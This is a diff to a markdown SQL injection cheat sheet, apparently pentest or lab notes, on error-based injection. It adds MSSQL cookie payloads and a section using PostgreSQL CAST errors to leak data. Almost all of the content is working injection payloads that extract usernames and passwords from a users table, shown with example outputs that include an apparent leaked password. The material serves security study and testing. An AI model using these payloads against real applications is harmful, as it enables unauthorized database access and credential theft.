@@ -133,7 +133,7 @@ SELECT sleep(10)
 
 ## Error base SQLi
 
-You can test a single boolean condition and trigger a database error if the condition is true.
+You can test a single boolean condition and trigger a database error if the condition is true. 
 
 ```sql
 # MySQL
@@ -142,16 +142,30 @@ SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables)
 'xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'-- -
 
 # Oracle
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
 ## Example
-TrackingId='nh7zNp4i65rBGFKX' AND (SELECT CASE WHEN ((SELECT SUBSTR(password,20,1) FROM users WHERE username='administrator')='§a§') THEN NULL ELSE to_char(1/0) END FROM dual)=1-- -; 
+TrackingId='nh7zNp4i65rBGFKX' AND (SELECT CASE WHEN ((SELECT SUBSTR(password,20,1) FROM users WHERE username='administrator')='§a§') THEN NULL ELSE to_char(1/0) END FROM dual)=1-- -;
 
 # MSSQL
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END 
+cookie1=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
+cookie1=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 
 # PostgreSQL
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
 1 = SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+```
+
+Some time servers also disclose verbose errors about the query, allowing to retrieve internal data:
+```sql
+CAST((SELECT example_column FROM example_table) AS int) -- # ERROR: invalid input syntax for type integer: "Example data"
+
+# Example
+TrackingId='ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- # Error: `AND` condition must be a boolean expression.
+TrackingId='ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- # OK
+TrackingId='' AND 1=CAST((SELECT username FROM users) AS int)-- # Error: more then one row
+TrackingId='' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- # ERROR: invalid input syntax for type integer: "administrator"
+TrackingId='' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- # ERROR: invalid input syntax for type integer: "txp8n9ngydm953sli8k2"
 ```
 
 ---
